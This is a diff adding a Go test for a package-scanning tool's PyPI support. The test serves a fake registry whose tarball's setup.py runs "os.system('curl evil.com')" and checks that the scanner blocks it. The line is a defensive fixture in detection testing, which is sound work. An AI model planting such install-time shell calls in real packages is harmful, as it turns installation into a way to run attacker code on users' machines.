@@ -1,12 +1,21 @@
 package ci
 
 import (
+	"archive/tar"
+	"bytes"
+	"compress/gzip"
+	"crypto/sha256"
+	"encoding/hex"
 	"encoding/json"
+	"net/http"
+	"net/http/httptest"
 	"os"
 	"os/exec"
 	"path/filepath"
 	"strings"
 	"testing"
+
+	rpypi "github.com/niyam-ai/pkgsafe/internal/registry/pypi"
 )
 
 func TestCI_RunScan_DefaultLockfileNotFound(t *testing.T) {
@@ -250,7 +259,7 @@ trusted_packages:
 func TestCI_GitRepoDetectionAndDiff(t *testing.T) {
 	// Set up a real Git repository in temp directory
 	tmp := t.TempDir()
-	
+
 	runGit := func(args ...string) error {
 		cmd := exec.Command("git", args...)
 		cmd.Dir = tmp
@@ -373,4 +382,162 @@ func TestCI_FailOnBehavior(t *testing.T) {
 			t.Errorf("failOn=%q decision=%q: expected reached=%v, got %v", tt.failOn, tt.decision, tt.thresholdReached, reached)
 		}
 	}
+}
+
+func TestCI_RunScan_PyPI(t *testing.T) {
+	tmp := t.TempDir()
+	reqFile := filepath.Join(tmp, "requirements.txt")
+	if err := os.WriteFile(reqFile, []byte("requests==2.31.0\npydantic\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+
+	tarballContent := makeTarball(t, map[string]string{
+		"setup.py": "import os; os.system('curl evil.com')",
+	})
+	hash := sha256.Sum256(tarballContent)
+	hashHex := hex.EncodeToString(hash[:])
+
+	mux := http.NewServeMux()
+	var srv *httptest.Server
+	mux.HandleFunc("/requests/json", func(w http.ResponseWriter, r *http.Request) {
+		md := rpypi.Metadata{
+			Info: rpypi.Info{Name: "requests", Version: "2.31.0"},
+			Releases: map[string][]rpypi.File{
+				"2.31.0": {
+					{
+						Filename:    "requests-2.31.0.tar.gz",
+						PackageType: "sdist",
+						URL:         srv.URL + "/tarballs/requests-2.31.0.tar.gz",
+						Size:        int64(len(tarballContent)),
+						Digests:     map[string]string{"sha256": hashHex},
+					},
+				},
+			},
+		}
+		_ = json.NewEncoder(w).Encode(md)
+	})
+	mux.HandleFunc("/pydantic/json", func(w http.ResponseWriter, r *http.Request) {
+		md := rpypi.Metadata{
+			Info: rpypi.Info{Name: "pydantic", Version: "2.7.0"},
+			Releases: map[string][]rpypi.File{
+				"2.7.0": {
+					{
+						Filename:    "pydantic-2.7.0.tar.gz",
+						PackageType: "sdist",
+						URL:         srv.URL + "/tarballs/pydantic-2.7.0.tar.gz",
+						Size:        int64(len(tarballContent)),
+						Digests:     map[string]string{"sha256": hashHex},
+					},
+				},
+			},
+		}
+		_ = json.NewEncoder(w).Encode(md)
+	})
+	mux.HandleFunc("/tarballs/", func(w http.ResponseWriter, r *http.Request) {
+		_, _ = w.Write(tarballContent)
+	})
+	srv = httptest.NewServer(mux)
+	defer srv.Close()
+
+	oldURL := rpypi.DefaultRegistryURL
+	rpypi.DefaultRegistryURL = srv.URL
+	defer func() { rpypi.DefaultRegistryURL = oldURL }()
+
+	policyPath := filepath.Join(tmp, "policy.yaml")
+	policyContent := `
+mode: block
+thresholds:
+  allow_max_score: 29
+  warn_max_score: 69
+  block_min_score: 70
+rules:
+  pypi_setup_py_present:
+    enabled: true
+    severity: medium
+    score: 15
+  pypi_setup_py_shell_execution:
+    enabled: true
+    severity: high
+    score: 50
+`
+	if err := os.WriteFile(policyPath, []byte(policyContent), 0o644); err != nil {
+		t.Fatal(err)
+	}
+
+	jsonOut := filepath.Join(tmp, "results.json")
+	sarifOut := filepath.Join(tmp, "results.sarif")
+	mdOut := filepath.Join(tmp, "summary.md")
+
+	opts := ScanOptions{
+		DependencyFile: reqFile,
+		Ecosystem:      "pypi",
+		PolicyPath:     policyPath,
+		FailOn:         "block",
+		JsonOutput:     jsonOut,
+		SarifOutput:    sarifOut,
+		SummaryOutput:  mdOut,
+	}
+
+	res, err := RunScan(opts)
+	if err != nil {
+		t.Fatal(err)
+	}
+
+	if res == nil {
+		t.Fatal("expected non-nil ScanResult")
+	}
+
+	if res.Decision != "block" {
+		t.Fatalf("expected decision block, got %s", res.Decision)
+	}
+
+	if err := WriteJSONOutput(jsonOut, res); err != nil {
+		t.Fatal(err)
+	}
+	if err := WriteSarifOutput(sarifOut, res); err != nil {
+		t.Fatal(err)
+	}
+	if err := WriteSummaryOutput(mdOut, res); err != nil {
+		t.Fatal(err)
+	}
+
+	// Verify SARIF output file exists and is valid 2.1.0 SARIF
+	sb, err := os.ReadFile(sarifOut)
+	if err != nil {
+		t.Fatal(err)
+	}
+	var sarif SarifReport
+	if err := json.Unmarshal(sb, &sarif); err != nil {
+		t.Fatal("SARIF output is not valid JSON:", err)
+	}
+	if sarif.Version != "2.1.0" {
+		t.Fatalf("expected SARIF version '2.1.0', got %q", sarif.Version)
+	}
+}
+
+func makeTarball(t *testing.T, files map[string]string) []byte {
+	t.Helper()
+	var buf bytes.Buffer
+	gw := gzip.NewWriter(&buf)
+	tw := tar.NewWriter(gw)
+	for name, content := range files {
+		hdr := &tar.Header{
+			Name: name,
+			Mode: 0644,
+			Size: int64(len(content)),
+		}
+		if err := tw.WriteHeader(hdr); err != nil {
+			t.Fatal(err)
+		}
+		if _, err := tw.Write([]byte(content)); err != nil {
+			t.Fatal(err)
+		}
+	}
+	if err := tw.Close(); err != nil {
+		t.Fatal(err)
+	}
+	if err := gw.Close(); err != nil {
+		t.Fatal(err)
+	}
+	return buf.Bytes()
 }
